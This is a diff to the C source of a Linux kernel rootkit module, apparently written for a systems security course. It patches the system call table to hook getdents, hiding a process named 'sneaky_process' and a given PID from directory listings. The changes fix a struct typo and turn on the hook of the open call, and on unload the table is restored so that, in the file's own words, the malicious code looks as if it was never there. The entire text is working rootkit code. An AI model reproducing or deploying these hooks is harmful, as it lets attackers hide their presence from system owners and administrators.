@@ -11,7 +11,6 @@
 
 static char * mypid = "";
 module_param(mypid, charp, 0);
-;
 MODULE_PARM_DESC(mypid, "current pid of the sneaky process");
 
 struct linux_dirent {
@@ -58,7 +57,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
   int nread = original_sys_getdents(fd, dirp, count);
   int bpos;
   for (bpos = 0; bpos < nread;) {
-    struct linux_dirend * d = (void *)dirp + bpos;
+    struct linux_dirent * d = (void *)dirp + bpos;
     if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, mypid) == 0) {
       void * next = (void *)d + d->d_reclen;
       int to_move = (void *)dirp + nread - next;
@@ -70,7 +69,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
   }
   return nread;
 }
-/*
+
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
@@ -78,7 +77,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
   printk(KERN_INFO "Very, very Sneaky!\n");
   return original_sys_open(pathname, flags);
 }
-
+/*
 //Define our new sneaky version of the 'read' syscall
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
   //TODO
@@ -106,11 +105,11 @@ static int initialize_sneaky_module(void) {
   //"getdents" system call
   original_sys_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
-  /*
   //"open" system call
   original_sys_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   //"read" system call
+  /*
   original_sys_read = (void*)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
   */
@@ -139,10 +138,9 @@ static void exit_sneaky_module(void) {
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_getdents) = (unsigned long)original_sys_getdents;
-  /*
   *(sys_call_table + __NR_open) = (unsigned long)original_sys_open;
-  *(sys_call_table + __NR_read) = (unsigned long)original_sys_open;
-  */
+  //*(sys_call_table + __NR_read) = (unsigned long)original_sys_read;
+  
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
